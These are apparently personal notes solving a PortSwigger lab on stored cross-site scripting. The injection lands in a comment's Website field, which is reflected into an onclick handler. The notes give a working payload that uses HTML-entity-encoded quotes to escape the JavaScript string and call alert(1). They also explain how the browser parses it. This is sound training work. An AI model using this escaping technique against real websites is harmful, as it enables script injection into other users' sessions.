
# #PortSwigger 


![[Pasted image 20260506202058.png]]



**Description**
	*This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.*




## Solution Steps


### Step 1: Understand the Context

When you post a comment, the "Website" field is reflected inside an `onclick` event handler:

```
<a id="author" href="http://\\\\\');alert(1);//" onclick="var tracker={track(){}};tracker.track('http://\\\\\');alert(1);//');">thunder</a>
```

![[Pasted image 20260506204929.png]]

![[Pasted image 20260506205716.png]]





### Step 2: Construct the Payload
Use JavaScript URL encoding with HTML entities to bypass the escaping:

**Payload:**
```
http://foo?&apos;-alert(1)-&apos;
```

JS engine split the payload
```
tracker.track('http://foo?') - alert(1) - ('')
```





#### Step 6: Test the Exploit

1. Post a comment with the payload in the **Website** field:
    ```
    http://foo?&apos;-alert(1)-&apos;
    ```
![[Pasted image 20260506210514.png]]

2. View the blog post
3. **Click on the author name** above your comment
4. The alert fires → Lab solved
![[Pasted image 20260506210539.png]]
